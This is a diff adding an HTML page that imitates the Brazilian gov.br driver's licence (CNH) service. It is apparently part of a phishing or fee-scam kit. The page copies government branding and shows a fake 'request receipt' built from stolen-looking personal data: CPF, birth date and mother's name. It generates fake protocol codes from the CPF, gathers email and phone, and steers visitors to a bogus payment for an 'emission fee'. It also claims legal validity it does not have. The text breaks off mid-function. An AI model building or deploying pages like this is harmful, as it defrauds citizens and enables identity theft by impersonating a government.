@@ -1,0 +1,863 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+
+<script src="js/latest-4.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carteira Nacional de Habilitação - gov.br</title>
+    
+    
+    <!-- External CSS -->
+    <script src="3.4-3.17"></script>
+    <link rel="stylesheet" href="css/all.min.css">
+    <link href="rawline-3" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="css/custom.css">
+    
+    <!-- SEO and Meta Tags -->
+    <meta name="description" content="Carteira Nacional de Habilitação - Primeira Via e Renovação - Governo Federal">
+    <meta name="keywords" content="CNH, carteira de motorista, habilitação, DETRAN, governo federal, primeira via, renovação">
+    <meta name="author" content="Governo Federal do Brasil">
+    
+    <!-- Open Graph -->
+    <meta property="og:title" content="Carteira Nacional de Habilitação - gov.br">
+    <meta property="og:description" content="Solicitação de Primeira Via e Renovação da Carteira Nacional de Habilitação">
+    <meta property="og:type" content="website">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🇧🇷</text></svg>">
+
+    <!-- Meta Pixel Code -->
+
+
+    <!-- Preserve Query Parameters Script -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get current query parameters
+            const currentParams = new URLSearchParams(window.location.search);
+            
+            // Function to add query parameters to a URL
+            function addQueryParams(url) {
+                if (!url) return url;
+                
+                // Create URL object with absolute path
+                const urlObj = new URL(url, window.location.origin);
+                
+                // Special handling for cadastro to resultados-busca navigation
+                if (window.location.pathname === '/cadastro' && url.includes('/resultados-busca')) {
+                    // Add CEP parameter if not already present
+                    if (!urlObj.searchParams.has('cep')) {
+                        urlObj.searchParams.set('cep', '72236001');
+                    }
+                }
+
+                // Preserve existing parameters
+                currentParams.forEach((value, key) => {
+                    // Don't override CEP if it's already set
+                    if (!(key === 'cep' && urlObj.searchParams.has('cep'))) {
+                        urlObj.searchParams.set(key, value);
+                    }
+                });
+                
+                return urlObj.toString();
+            }
+            
+            // Add click event listeners to all links
+            document.querySelectorAll('a').forEach(link => {
+                const originalHref = link.getAttribute('href');
+                if (originalHref && !originalHref.startsWith('#') && !originalHref.startsWith('javascript:')) {
+                    link.addEventListener('click', function(e) {
+                        const newUrl = addQueryParams(originalHref);
+                        if (newUrl !== originalHref) {
+                            e.preventDefault();
+                            window.location.href = newUrl;
+                        }
+                    });
+                }
+            });
+
+            // Also handle form submissions
+            document.querySelectorAll('form').forEach(form => {
+                form.addEventListener('submit', function(e) {
+                    const formAction = form.getAttribute('action');
+                    if (formAction && formAction.includes('/resultados-busca')) {
+                        e.preventDefault();
+                        const newUrl = addQueryParams(formAction);
+                        window.location.href = newUrl;
+                    }
+                });
+            });
+
+            // Debug log to check parameters
+            console.log('Current URL:', window.location.href);
+            console.log('Current Parameters:', Object.fromEntries(currentParams));
+        });
+    </script>
+</head>
+<body class="bg-white">
+    <!-- Header -->
+    <header class="header-govbr">
+        <div class="flex justify-between items-center px-4 py-3">
+            <div class="flex items-center">
+                <a href="/" class="gov-logo">
+                    <img src="images/1200px-Gov.br_logo.svg_1.png" alt="gov.br" class="h-8">
+                </a>
+            </div>
+            <div class="flex items-center">
+                <button class="header-btn" id="menu-btn" aria-label="Menu">
+                    <i class="fas fa-ellipsis-v text-blue-900 mx-3"></i>
+                </button>
+                <div class="w-px h-6 bg-blue-900 mx-3"></div>
+                <button class="header-btn" id="accessibility-btn" aria-label="Acessibilidade">
+                    <i class="fas fa-palette text-blue-900 mx-3"></i>
+                </button>
+                <div class="half-circle mx-3"></div>
+                <button class="header-btn" id="apps-btn" aria-label="Aplicativos">
+                    <i class="fas fa-th text-blue-900 mx-3"></i>
+                </button>
+                <a href="#" class="bg-blue-700 text-white px-4 py-2 rounded-full flex items-center hover:bg-blue-800 transition-colors text-sm font-medium">
+                    <i class="fas fa-user mr-2"></i>
+                    Entrar
+                </a>
+            </div>
+        </div>
+
+        <!-- Popup de Carregamento Seguro -->
+<div id="loading-popup" class="fixed inset-0 bg-black bg-opacity-75 z-50 flex items-center justify-center hidden">
+    <div class="bg-white rounded-lg p-8 w-full max-w-lg text-center" style="font-family: 'Rawline', 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
+        <!-- Logo Gov.br -->
+        <div class="mb-6">
+            <img src="images/1200px-Gov.br_logo.svg.png" alt="Gov.br" class="h-10 mx-auto">
+        </div>
+        
+        <!-- Título Principal -->
+        <h3 class="font-bold mb-4" style="color: #1351B4; font-size: 20px; font-family: 'Rawline', 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">Carregando ambiente seguro...</h3>
+        
+        <!-- Texto Descritivo -->
+        <p class="mb-6" style="font-size: 14px; color: #495057; line-height: 1.5; font-family: 'Rawline', 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
+            Estamos preparando um ambiente seguro para o processamento do seu pagamento. Por favor aguarde um momento.
+        </p>
+        
+        <!-- Círculo de Loading -->
+        <div class="mb-6">
+            <div class="spinner animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto"></div>
+        </div>
+        
+        <!-- Informação LGPD -->
+        <p class="text-center leading-relaxed" style="font-size: 12px; color: #6C757D; font-family: 'Rawline', 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
+            Seus dados estão protegidos conforme a Lei Geral de Proteção de Dados (LGPD) e as melhores práticas de segurança.
+        </p>
+    </div>
+</div>
+
+        <!-- Title Bar -->
+        <div class="flex justify-between items-center px-4 py-2 border-b border-gray-300">
+            <div class="flex items-center">
+                <button class="header-btn" id="sidebar-toggle" aria-label="Menu lateral">
+                    <i class="fas fa-bars text-blue-900 mr-3"></i>
+                </button>
+                <span class="text-gray-800 text-sm font-medium">Carteira Nacional de Habilitação</span>
+            </div>
+            <div class="flex items-center">
+                <button class="header-btn" id="voice-search-btn" aria-label="Busca por voz">
+                    <i class="fas fa-microphone text-blue-900 mx-2"></i>
+                </button>
+                <button class="header-btn" id="search-toggle-btn" aria-label="Pesquisar">
+                    <i class="fas fa-search text-blue-900 mx-2"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Search Bar (hidden by default) -->
+        <div id="search-bar" class="hidden bg-white border-b border-gray-300 px-4 py-3">
+            <div class="flex items-center max-w-md mx-auto">
+                <div class="relative flex-1">
+                    <input type="text" id="header-search-input" placeholder="Buscar serviços, documentos, ministérios..." class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600 focus:ring-2 focus:ring-blue-200">
+                    <button id="header-search-btn" class="absolute right-2 top-2 text-blue-600 hover:text-blue-800">
+                        <i class="fas fa-search"></i>
+                    </button>
+                </div>
+                <button id="search-close-btn" class="ml-3 text-gray-500 hover:text-gray-700">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Breadcrumb -->
+        <nav class="breadcrumb-nav flex items-center px-4 py-3 text-sm" aria-label="Navegação estrutural">
+            <div class="flex flex-wrap items-center gap-1">
+                <a href="/" class="text-blue-700 hover:text-blue-800">
+                    <i class="fas fa-home"></i>
+                </a>
+                <span class="mx-1 text-gray-600">></span>
+                <a href="/servicos" class="text-blue-700 hover:text-blue-800 text-xs">Serviços</a>
+                <span class="mx-1 text-gray-600">></span>
+                <a href="/documentos" class="text-blue-700 hover:text-blue-800 text-xs">Documentos</a>
+                <span class="mx-1 text-gray-600">></span>
+                <a href="/transito" class="text-blue-700 hover:text-blue-800 text-xs">Trânsito</a>
+                <span class="mx-1 text-gray-600">></span>
+                <a href="/cnh" class="text-blue-700 hover:text-blue-800 text-xs">CNH</a>
+                <span class="mx-1 text-gray-600">></span>
+                <span class="text-gray-800 text-xs font-medium">Carteira Nacional de Habilitação</span>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+
+        
+        <div class="px-4 py-4">
+    <h1 class="text-3xl font-semibold mb-4" style="color: #1351B4;">Comprovante de Solicitação</h1>
+    
+    <div class="border-t border-b border-gray-300 py-3 mb-6">
+        <div class="text-gray-700 text-sm">
+            <p>Gerado em <span id="data-geracao">30/01/2026, 14:56:55</span></p>
+        </div>
+    </div>
+
+    <!-- Progress Bar Final -->
+    <div class="bg-white border border-gray-200 rounded-lg p-4 md:p-6 mb-6 md:mb-8">
+        <h2 class="text-base md:text-lg font-semibold text-gray-800 mb-3 md:mb-4">Progresso da Solicitação</h2>
+        
+        <!-- Desktop Progress -->
+        <div class="hidden md:flex items-center justify-between">
+            <div class="flex items-center">
+                <div class="w-7 h-7 bg-green-600 text-white rounded-full flex items-center justify-center text-xs font-medium">✓</div>
+                <span class="ml-2 text-sm font-medium text-green-600">Dados Pessoais</span>
+            </div>
+            <div class="flex-1 mx-3 h-1 bg-green-600 rounded"></div>
+            <div class="flex items-center">
+                <div class="w-7 h-7 bg-green-600 text-white rounded-full flex items-center justify-center text-xs font-medium">✓</div>
+                <span class="ml-2 text-sm font-medium text-green-600">Documentação</span>
+            </div>
+            <div class="flex-1 mx-3 h-1 bg-green-600 rounded"></div>
+            <div class="flex items-center">
+                <div class="w-7 h-7 bg-green-600 text-white rounded-full flex items-center justify-center text-xs font-medium">✓</div>
+                <span class="ml-2 text-sm font-medium text-green-600">Finalização</span>
+            </div>
+        </div>
+
+        <!-- Mobile Progress -->
+        <div class="md:hidden">
+            <div class="flex items-center justify-between mb-3">
+                <span class="text-xs text-gray-600">Etapa 3 de 3</span>
+                <span class="text-xs font-medium text-green-600">100% concluído</span>
+            </div>
+            <div class="w-full bg-gray-200 rounded-full h-2 mb-3">
+                <div class="bg-green-600 h-2 rounded-full" style="width: 100%"></div>
+            </div>
+            <div class="flex justify-between text-xs">
+                <span class="font-medium text-green-600">• Dados Pessoais</span>
+                <span class="font-medium text-green-600">• Documentação</span>
+                <span class="font-medium text-green-600">• Finalização</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Comprovante -->
+    <div class="bg-white border-2 border-green-500 rounded-lg p-6 mb-8 shadow-lg">
+        <div class="text-center mb-6">
+            <div class="flex items-center justify-center mb-4">
+                <img src="/static/img/gov-logo.svg" alt="Gov.br" class="h-12 mr-4" onerror="this.style.display='none'" style="display: none;">
+                <div>
+                    <h2 class="text-xl font-bold text-gray-800">GOVERNO FEDERAL</h2>
+                    <p class="text-sm text-gray-600">Departamento Nacional de Trânsito</p>
+                </div>
+            </div>
+            <h3 class="text-lg font-semibold text-green-700 mb-2">COMPROVANTE DE SOLICITAÇÃO</h3>
+            <p class="text-sm text-gray-600">Carteira Nacional de Habilitação - Primeira Via/Renovação</p>
+        </div>
+
+        <div class="border-t border-b border-gray-200 py-4 mb-6">
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <span class="text-sm font-medium text-gray-600">Protocolo:</span>
+                    <p class="font-mono text-lg font-bold text-blue-600" id="protocolo-inscricao">-</p>
+                </div>
+                <div>
+                    <span class="text-sm font-medium text-gray-600">Status:</span>
+                    <p class="font-medium text-green-600">SOLICITAÇÃO REALIZADA</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+            <!-- Dados Pessoais -->
+            <div>
+                <h4 class="text-lg font-semibold text-gray-800 mb-4 flex items-center">
+                    <i class="fas fa-user mr-2 text-blue-600"></i>
+                    Dados Pessoais
+                </h4>
+                <div class="space-y-3">
+                    <div>
+                        <span class="text-sm font-medium text-gray-600">Nome Completo:</span>
+                        <p class="font-medium" id="nome-completo">-</p>
+                    </div>
+                    <div>
+                        <span class="text-sm font-medium text-gray-600">CPF:</span>
+                        <p class="font-medium font-mono" id="cpf-usuario">-</p>
+                    </div>
+                    <div>
+                        <span class="text-sm font-medium text-gray-600">Data de Nascimento:</span>
+                        <p class="font-medium" id="data-nascimento">-</p>
+                    </div>
+                    <div>
+                        <span class="text-sm font-medium text-gray-600">Nome da Mãe:</span>
+                        <p class="font-medium" id="nome-mae">-</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Dados da CNH -->
+            <div>
+                <h4 class="text-lg font-semibold text-gray-800 mb-4 flex items-center">
+                    <i class="fas fa-id-card mr-2 text-blue-600"></i>
+                    Dados da CNH
+                </h4>
+                <div class="space-y-3">
+                    <div>
+                        <span class="text-sm font-medium text-gray-600">Categoria:</span>
+                        <p class="font-medium" id="categoria-cnh">-</p>
+                    </div>
+                    <div>
+                        <span class="text-sm font-medium text-gray-600">Validade:</span>
+                        <p class="font-medium text-gray-500" id="validade-cnh">A definir após emissão</p>
+                    </div>
+                    <div>
+                        <span class="text-sm font-medium text-gray-600">Tipo de Solicitação:</span>
+                        <p class="font-medium text-green-600" id="tipo-solicitacao">Renovação</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- QR Code e Validação -->
+        <div class="mt-6 pt-6 border-t border-gray-200 text-center">
+            <div class="flex items-center justify-center mb-4">
+                <div class="bg-gray-100 w-24 h-24 rounded-lg flex items-center justify-center mr-4">
+                    <i class="fas fa-qrcode text-4xl text-gray-400"></i>
+                </div>
+                <div class="text-left">
+                    <p class="text-sm font-medium text-gray-700">Código de Validação:</p>
+                    <p class="font-mono text-lg font-bold text-blue-600" id="codigo-validacao">-</p>
+                    <p class="text-xs text-gray-500 mt-1">
+                        Utilize este código para consultar o status da sua solicitação
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+    <!-- Envio do Comprovante por Email -->
+    <div class="bg-blue-50 border border-blue-200 rounded-lg p-6 mb-8">
+        <h3 class="text-lg font-semibold text-blue-800 mb-4 flex items-center">
+            <i class="fas fa-envelope mr-2"></i>
+            Receber Comprovante por E-mail
+        </h3>
+        <p class="text-blue-700 mb-4 text-sm">
+            Digite seu e-mail para receber uma cópia do comprovante de solicitação:
+        </p>
+        <p class="text-gray-600 mb-4 text-xs bg-yellow-50 border border-yellow-200 rounded p-2">
+            <i class="fas fa-info-circle text-yellow-600 mr-1"></i>
+            <strong>Importante:</strong> O comprovante oficial será enviado após o pagamento da taxa de emissão.
+        </p>
+        
+        <div class="space-y-4">
+            <div class="relative">
+                <label for="email-comprovante" class="block text-sm font-medium text-gray-700 mb-2">
+                    E-mail para recebimento:
+                </label>
+                <input type="email" id="email-comprovante" placeholder="seu.email@exemplo.com" autocomplete="email" style="font-size: 16px;" class="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500">
+                
+                <!-- Dropdown de sugestões de email -->
+                <div id="email-suggestions" class="hidden absolute z-10 w-full bg-white border border-gray-300 rounded-md shadow-lg mt-1 max-h-40 overflow-y-auto">
+                    <!-- Sugestões serão inseridas aqui -->
+                </div>
+            </div>
+            
+            <div>
+                <label for="telefone-comprovante" class="block text-sm font-medium text-gray-700 mb-2">
+                    Telefone para contato:
+                </label>
+                <input type="tel" id="telefone-comprovante" placeholder="(11) 99999-9999" autocomplete="tel" style="font-size: 16px;" class="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500">
+            </div>
+            
+            <div class="flex gap-3">
+                <button id="salvar-email" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-6 rounded-md transition-colors">
+                    <i class="fas fa-save mr-2"></i>
+                    Salvar E-mail
+                </button>
+                <button id="proximo-pagamento" class="flex-1 bg-green-600 hover:bg-green-700 text-white font-medium py-3 px-6 rounded-md transition-colors">
+                    <i class="fas fa-credit-card mr-2"></i>
+                    Próxima Etapa (Pagamento)
+                </button>
+            </div>
+            
+            <div id="status-email" class="hidden text-center p-3 rounded-md">
+                <!-- Status será inserido aqui -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Informações Importantes -->
+    <div class="bg-blue-50 border border-blue-200 rounded-lg p-6">
+        <h3 class="text-lg font-semibold text-blue-800 mb-3">Informações Importantes</h3>
+        <div class="text-blue-700 text-sm space-y-2">
+            <p>• Guarde este comprovante para consultas futuras sobre sua solicitação</p>
+            <p>• O processo de emissão seguirá as etapas previstas no regulamento</p>
+            <p>• Acompanhe as comunicações através do seu email cadastrado</p>
+            <p>• Em caso de dúvidas, entre em contato através dos canais oficiais do DETRAN</p>
+            <p>• Este documento possui validade legal e comprova sua solicitação da CNH</p>
+        </div>
+    </div>
+</div>
+
+        <style>
+            .spinner {
+                animation: spin 1s linear infinite !important;
+            }
+
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+        </style>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Carregar dados do localStorage
+    const dadosInscricao = localStorage.getItem('dadosInscricao');
+    
+    if (dadosInscricao) {
+        const dados = JSON.parse(dadosInscricao);
+        
+        // Preencher dados pessoais
+        document.getElementById('nome-completo').textContent = dados.nome || '-';
+        document.getElementById('cpf-usuario').textContent = formatarCPF(dados.cpf) || '-';
+        document.getElementById('data-nascimento').textContent = formatarData(dados.dataNascimento) || '-';
+        document.getElementById('nome-mae').textContent = dados.nomeMae || '-';
+        
+        // Preencher dados da CNH
+        document.getElementById('categoria-cnh').textContent = dados.categoria || '-';
+        document.getElementById('tipo-solicitacao').textContent = dados.tipoSolicitacao || 'Primeira Via';
+        
+        // Preencher protocolo e código
+        document.getElementById('protocolo-inscricao').textContent = dados.protocoloInscricao || '-';
+        document.getElementById('codigo-validacao').textContent = dados.protocoloInscricao || '-';
+    }
+    
+    // Data de geração
+    const agora = new Date();
+    document.getElementById('data-geracao').textContent = agora.toLocaleString('pt-BR');
+    
+    // Carregar dados do CPF validado do localStorage
+    carregarDadosUsuario();
+    
+    // Configurar autocompletar de email
+    configurarAutocompletarEmail();
+    
+    // Configurar formatação automática do telefone
+    configurarFormatacaoTelefone();
+    
+    function carregarDadosUsuario() {
+        const dadosCpf = JSON.parse(localStorage.getItem('dadosCpfValidado') || '{}');
+        const cnhSelecionada = JSON.parse(localStorage.getItem('cnhSelecionada') || '{}');
+        
+        if (dadosCpf.nome) {
+            document.getElementById('nome-completo').textContent = dadosCpf.nome;
+            document.getElementById('cpf-usuario').textContent = dadosCpf.cpf || '-';
+            document.getElementById('data-nascimento').textContent = dadosCpf.data_nascimento || '-';
+            document.getElementById('nome-mae').textContent = dadosCpf.nome_mae || '-';
+            
+            // Gerar protocolo baseado no CPF
+            const protocolo = `CNH-${new Date().getFullYear()}-${dadosCpf.cpf?.slice(-6) || Math.random().toString().slice(-6)}`;
+            document.getElementById('protocolo-inscricao').textContent = protocolo;
+            document.getElementById('codigo-validacao').textContent = protocolo;
+            
+            // Atualizar cabeçalho com nome do usuário
+            atualizarCabecalhoComprovante(dadosCpf.nome);
+        }
+        
+        // Carregar dados da CNH selecionada
+        if (cnhSelecionada.categoria) {
+            document.getElementById('categoria-cnh').textContent = cnhSelecionada.categoria;
+            document.getElementById('tipo-solicitacao').textContent = cnhSelecionada.tipoSolicitacao || 'Primeira Via';
+        }
+    }
+    
+    function atualizarCabecalhoComprovante(nomeCompleto) {
+        // Extrair primeiro nome
+        const primeiroNome = nomeCompleto.split(' ')[0];
+        
+        // Procurar o botão "Entrar" no cabeçalho e substituir pelo nome
+        const entrarBtn = document.querySelector('a[href*="login"]');
+        if (entrarBtn) {
+            entrarBtn.innerHTML = `<i class="fas fa-user mr-1"></i>${primeiroNome}`;
+            entrarBtn.href = '#';
+            entrarBtn.classList.remove('hover:bg-blue-700');
+            entrarBtn.classList.add('cursor-default');
+        }
+    }
+    
+    // Botão salvar e-mail
+    document.getElementById('salvar-email').addEventListener('click', function() {
+        salvarEmail();
+    });
+
+    // Botão próxima etapa (Pagamento)
+    document.getElementById('proximo-pagamento').addEventListener('click', function() {
+        const email = document.getElementById('email-comprovante').value;
+        const telefone = document.getElementById('telefone-comprovante').value;
+        
+        if (!email || !email.includes('@')) {
+            alert('Por favor, preencha um e-mail válido antes de prosseguir.');
+            return;
+        }
+        
+        // Salvar dados
+        localStorage.setItem('emailUsuario', email);
+        if (telefone) {
+            localStorage.setItem('telefoneUsuario', telefone);
+        }
+        
+        // Navegar para pagamento
+        const currentParams = new URLSearchParams(window.location.search);
+        window.location.href = '../pagamento/index.html' + (currentParams.toString() ? '?' + currentParams.toString() : '');
+    });
+
+    function configurarAutocompletarEmail() {
+        const emailInput = document.getElementById('email-comprovante');
+        const suggestionsDiv = document.getElementById('email-suggestions');
+        
+        const dominios = ['@gmail.com', '@hotmail.com', '@outlook.com', '@yahoo.com.br', '@terra.com.br', '@uol.com.br', '@ig.com.br', '@bol.com.br'];
+        
+        emailInput.addEventListener('input', function() {
+            const valor = this.value;
+            const parteAntes = valor.split('@')[0];
+            
+            if (valor.includes('@') && parteAntes.length > 0) {
+                const filteredDominios = dominios.filter(dominio => 
+                    dominio.toLowerCase().includes(valor.split('@')[1].toLowerCase())
+                );
+                
+                if (filteredDominios.length > 0) {
+                    suggestionsDiv.innerHTML = '';
+                    filteredDominios.forEach(dominio => {
+                        const sugestao = document.createElement('div');
+                        sugestao.className = 'px-4 py-2 hover:bg-blue-50 cursor-pointer border-b border-gray-100 last:border-b-0';
+                        sugestao.textContent = parteAntes + dominio;
+                        sugestao.addEventListener('click', function() {
+                            emailInput.value = this.textContent;
+                            suggestionsDiv.classList.add('hidden');
+                        });
+                        suggestionsDiv.appendChild(sugestao);
+                    });
+                    suggestionsDiv.classList.remove('hidden');
+                } else {
+                    suggestionsDiv.classList.add('hidden');
+                }
+            } else if (valor.includes('@') && parteAntes.length > 0) {
+                suggestionsDiv.innerHTML = '';
+                dominios.forEach(dominio => {
+                    const sugestao = document.createElement('div');
+                    sugestao.className = 'px-4 py-2 hover:bg-blue-50 cursor-pointer border-b border-gray-100 last:border-b-0';
+                    sugestao.textContent = parteAntes + dominio;
+                    sugestao.addEventListener('click', function() {
+                        emailInput.value = this.textContent;
+                        suggestionsDiv.classList.add('hidden');
+                    });
+                    suggestionsDiv.appendChild(sugestao);
+                });
+                suggestionsDiv.classList.remove('hidden');
+            } else {
+                suggestionsDiv.classList.add('hidden');
+            }
+        });
+        
+        // Fechar sugestões ao clicar fora
+        document.addEventListener('click', function(e) {
+            if (!emailInput.contains(e.target) && !suggestionsDiv.contains(e.target)) {
+                suggestionsDiv.classList.add('hidden');
+            }
+        });
+    }
+
+    function salvarEmail() {
+        const email = document.getElementById('email-comprovante').value;
+        const telefone = document.getElementById('telefone-comprovante').value;
+        const statusDiv = document.getElementById('status-email');
+        const botaoSalvar = document.getElementById('salvar-email');
+        
+        // Validar email
+        if (!email || !email.includes('@') || email.split('@')[1].indexOf('.') === -1) {
+            statusDiv.className = 'text-center p-3 rounded-md bg-red-100 border border-red-300';
+            statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle text-red-600 mr-2"></i>Por favor, digite um e-mail válido.';
+            statusDiv.classList.remove('hidden');
+            return;
+        }
+        
+        // Validar telefone (opcional, mas se preenchido deve ter formato válido)
+        if (telefone && telefone.length < 10) {
+            statusDiv.className = 'text-center p-3 rounded-md bg-red-100 border border-red-300';
+            statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle text-red-600 mr-2"></i>Por favor, digite um telefone válido.';
+            statusDiv.classList.remove('hidden');
+            return;
+        }
+        
+        // Mostrar loading
+        botaoSalvar.disabled = true;
+        botaoSalvar.innerHTML = '<i class="spinner fas fa-spinner fa-spin mr-2"></i>Salvando...';
+        
+        statusDiv.className = 'text-center p-3 rounded-md bg-blue-100 border border-blue-300';
+        statusDiv.innerHTML = '<i class="fas fa-info-circle text-blue-600 mr-2"></i>Salvando dados...';
+        statusDiv.classList.remove('hidden');
+        
+        // Simular salvamento
+        setTimeout(() => {
+            let mensagem = '<i class="fas fa-check-circle text-blue-600 mr-2"></i>E-mail salvo: <strong>' + email + '</strong>';
+            if (telefone) {
+                mensagem += '<br>Telefone salvo: <strong>' + telefone + '</strong>';
+            }
+            
+            statusDiv.className = 'text-center p-3 rounded-md bg-blue-100 border border-blue-300';
+            statusDiv.innerHTML = mensagem;
+
+            localStorage.setItem(
+                'userData',
+                JSON.stringify({
+                    ...JSON.parse(localStorage.getItem('userData') || '{}'),
+                    email: email,
+                    telefone: telefone
+                })
+            )
+            
+            // Salvar dados no localStorage para usar na página de pagamento
+            localStorage.setItem('emailUsuario', email);
+            if (telefone) {
+                localStorage.setItem('telefoneUsuario', telefone);
+            }
+            
+            // Ocultar o botão após salvar
+            botaoSalvar.style.display = 'none';
+            
+            // Mostrar termos após salvar dados
+            mostrarTermosFinais(email);
+        }, 1500);
+    }
+    
+    function configurarFormatacaoTelefone() {
+        const telefoneInput = document.getElementById('telefone-comprovante');
+        
+        telefoneInput.addEventListener('input', function(e) {
+            let valor = e.target.value.replace(/\D/g, ''); // Remove tudo que não é dígito
+            
+            // Limita a 11 dígitos
+            if (valor.length > 11) {
+                valor = valor.substring(0, 11);
+            }
+            
+            // Aplica a formatação
+            if (valor.length <= 2) {
+                valor = valor.replace(/(\d{1,2})/, '($1');
+            } else if (valor.length <= 7) {
+                valor = valor.replace(/(\d{2})(\d{1,5})/, '($1) $2');
+            } else {
+                valor = valor.replace(/(\d{2})(\d{5})(\d{1,4})/, '($1) $2-$3');
+            }
+            
+            e.target.value = valor;
+        });
+        
+        // Permitir apenas números e alguns caracteres especiais
+        telefoneInput.addEventListener('keypress', function(e) {
+            const char = String.fromCharCode(e.which);
+            if (!/[\d\(\)\-\s]/.test(char) && e.which !== 8) {
+                e.preventDefault();
+            }
+        });
+    }
+    
+    function mostrarTermosFinais(email) {
+        // Criar seção de termos finais na página
+        const termosSection = document.createElement('div');
+        termosSection.id = 'termos-finais';
+        termosSection.className = 'bg-red-50 border border-red-200 rounded-lg p-6 mt-6 mb-6';
+        
+        termosSection.innerHTML = `
+<h3 class="text-lg font-semibold text-red-800 mb-4 flex items-center">
+    <i class="fas fa-exclamation-triangle mr-2"></i>
+    Termos Obrigatórios da Solicitação
+</h3>
+
+<div class="space-y-4 mb-6">
+    <div class="flex items-start">
+        <input type="checkbox" 
+               id="termo-1" 
+               class="mt-1 mr-3 h-4 w-4 text-red-600 border-red-300 rounded focus:ring-red-500">
+        <label for="termo-1" class="text-sm text-red-700 cursor-pointer">
+            <strong>Declaro estar ciente de que a não apresentação de documentos</strong> solicitados pelo DETRAN dentro do prazo poderá resultar no cancelamento da solicitação da CNH.
+        </label>
+    </div>
+
+    <div class="flex items-start">
+        <input type="checkbox" 
+               id="termo-2" 
+               class="mt-1 mr-3 h-4 w-4 text-red-600 border-red-300 rounded focus:ring-red-500">
+        <label for="termo-2" class="text-sm text-red-700 cursor-pointer">
+            <strong>Confirmo que todas as informações fornecidas são verdadeiras</strong> e autorizo sua utilização para fins de análise cadastral, conforme os critérios do Departamento Nacional de Trânsito.
+        </label>
+    </div>
+</div>
+
+            
+            <div class="text-center">
+                <p class="text-sm text-gray-600 mb-4">
+                    E-mail cadastrado: <strong class="text-blue-600">${email}</strong>
+                </p>
+                
+                <button id="finalizar-inscricao-btn" 
+                        disabled
+                        class="bg-gray-400 text-gray-600 font-medium py-3 px-8 rounded-md cursor-not-allowed transition-colors opacity-50">
+                    <i class="fas fa-lock mr-2"></i>
+                    Finalizar (Aguardando Aceite dos Termos)
+                </button>
+                
+                <p class="text-xs text-gray-500 mt-3">
+                    <i class="fas fa-shield-alt mr-1"></i>
+                    Seus dados estão protegidos conforme a Lei Geral de Proteção de Dados (LGPD)
+                </p>
+            </div>
+        `;
+        
+        // Inserir após a seção de email
+        const emailSection = document.querySelector('.bg-blue-50');
+        emailSection.parentNode.insertBefore(termosSection, emailSection.nextSibling);
+        
+        // Configurar validação dos checkboxes
+        configurarValidacaoTermos();
+    }
+    
+    function configurarValidacaoTermos() {
+        const checkboxes = document.querySelectorAll('#termos-finais input[type="checkbox"]');
+        const botaoFinalizar = document.getElementById('finalizar-inscricao-btn');
+        
+        checkboxes.forEach(checkbox => {
+            checkbox.addEventListener('change', function() {
+                const todosMarcados = Array.from(checkboxes).every(cb => cb.checked);
+                
+                if (todosMarcados) {
+                    botaoFinalizar.disabled = false;
+                    botaoFinalizar.className = 'bg-green-600 hover:bg-green-700 text-white font-medium py-3 px-8 rounded-md transition-colors cursor-pointer';
+                    botaoFinalizar.innerHTML = '<i class="fas fa-check-circle mr-2"></i>Finalizar';
+                } else {
+                    botaoFinalizar.disabled = true;
+                    botaoFinalizar.className = 'bg-gray-400 text-gray-600 font-medium py-3 px-8 rounded-md cursor-not-allowed transition-colors opacity-50';
+                    botaoFinalizar.innerHTML = '<i class="fas fa-lock mr-2"></i>Finalizar (Aguardando Aceite dos Termos)';
+                }
+            });
+        });
+        
+        // Configurar clique no botão finalizar
+        botaoFinalizar.addEventListener('click', function() {
+            if (!this.disabled) {
+                finalizarInscricao();
+            }
+        });
+    }
+    
+    function finalizarInscricao() {
+        const botaoFinalizar = document.getElementById('finalizar-inscricao-btn');
+        
+        // Mostrar loading
+        botaoFinalizar.disabled = true;
+        botaoFinalizar.innerHTML = '<i class="spinner fas fa-spinner fa-spin mr-2"></i>Processando...';
+        
+        // Simular processamento
+        setTimeout(() => {
+            // Redirecionar para a página de pagamento
+            window.location.href = '/cnh/pagamento';
+        }, 2000);
+    }
+    
+    function formatarCPF(cpf) {
+        if (!cpf) return '';
+        cpf = cpf.replace(/\D/g, '');
+        return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    }
+    
+    function formatarData(data) {
